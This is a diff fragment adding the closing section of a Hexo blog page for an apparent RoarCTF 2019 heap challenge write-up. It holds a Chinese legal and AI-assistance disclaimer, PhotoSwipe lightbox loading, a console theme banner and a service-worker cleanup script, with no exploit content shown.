+          stripContent: "免责声明与说明 免责声明 本文仅用于 网络安全学习、CTF 题解与漏洞原理研究，所有操作均在作者自建的本地&amp;#x2F;虚拟环境中完成。禁止将文中方法、脚本用于未授权系统、生产网络或任何违法用途。若因滥用本文内容造成损失或法律后果，作者与转载平台 不承担任何责任；读者应自行遵守所在地法律法规。   关于 AI 辅助 本文主体为作者实操复现与笔记整理；其中 部分文字润色与结构归纳由 AI 生成&amp;#x2F;协助完成，并经作者核对后收录。代码、命令与截图请以可复现环境中的实际结果为准；如有错漏，欢迎指正",
+          date: "Tue Oct 13 2026 19:40:05 GMT+0800",
+          updated: "Tue Oct 13 2026 19:40:05 GMT+0800",
+          cover: "/images/RoarCTF2019_easyheap/Pasted-image-20261013122712.png",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.6' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
